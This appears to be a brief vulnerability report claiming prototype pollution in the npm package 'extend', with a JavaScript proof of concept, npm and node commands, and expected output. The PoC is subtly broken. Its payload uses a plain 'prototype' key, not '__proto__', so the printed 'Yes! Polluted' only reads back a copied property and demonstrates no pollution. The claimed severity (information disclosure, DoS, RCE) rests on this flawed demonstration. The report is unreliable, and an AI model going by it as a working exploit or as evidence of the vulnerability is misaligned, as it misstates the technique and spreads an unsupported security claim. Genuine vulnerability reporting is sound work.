# Description

`extend` is vulnerable to `Prototype Pollution`.
This package allowing for modification of prototype behavior, which may result in Information Disclosure/DoS/RCE.


# Proof of Concept

1. Create the following PoC file:

```js
// poc.js
let extend = require('extend');
let payload = JSON.parse('{"prototype": {"polluted": "Yes! Polluted"}}');
let object =extend({}, payload);
console.log(object.prototype.polluted);
```

2. Execute the following commands in another terminal:

```bash
npm i extend # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Yes! Polluted
```
